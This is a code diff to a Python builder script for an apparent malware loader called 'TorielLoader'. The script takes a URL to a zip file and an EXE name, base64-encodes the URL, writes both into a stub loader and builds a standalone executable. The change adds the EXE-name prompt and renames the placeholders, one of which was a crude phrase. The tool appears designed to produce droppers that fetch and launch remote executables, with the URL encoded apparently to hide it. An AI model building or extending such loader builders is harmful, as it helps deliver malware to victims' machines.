@@ -8,7 +8,12 @@ import base64
 def main():
     url = input('URL for zip file: ')
     if not url:
-        print(Fore.RED + 'You must provide a URL.' + Style.RESET_ALL)
+        print(Fore.RED + '[-] You must provide a URL.' + Style.RESET_ALL)
+        sys.exit(1)
+
+    exename = input('EXE name to look for (DONT ADD THE EXE EXTENSION): ')
+    if not exename:
+        print(Fore.RED + '[-] You must prvide an EXE name.')
         sys.exit(1)
 
     try:
@@ -16,7 +21,8 @@ def main():
         with open('stub/loader.py', 'r') as file:
             content = file.read()
 
-        content = content.replace('TORIEL_HAS_A_BIG_ASS', f'"{encoded_url}"')
+        content = content.replace('TORIEL_URL_HERE', f'"{encoded_url}"')
+        content = content.replace('TORIEL_NAME_FOR_EXE', f'"{exename}"')
 
         if not os.path.exists('dist'):
             os.mkdir('dist')
@@ -30,9 +36,9 @@ def main():
         print(Fore.GREEN + '[+] Executable built successfully: dist/TorielLoader.exe' + Style.RESET_ALL)
 
     except FileNotFoundError:
-        print(Fore.RED + 'Error: stub/loader.py not found.' + Style.RESET_ALL)
+        print(Fore.RED + '[-] Error: stub/loader.py not found.' + Style.RESET_ALL)
         sys.exit(1)
 
     except Exception as e:
-        print(Fore.RED + f'Error: {e}' + Style.RESET_ALL)
+        print(Fore.RED + f'[-] Error: {e}' + Style.RESET_ALL)
         sys.exit(1)
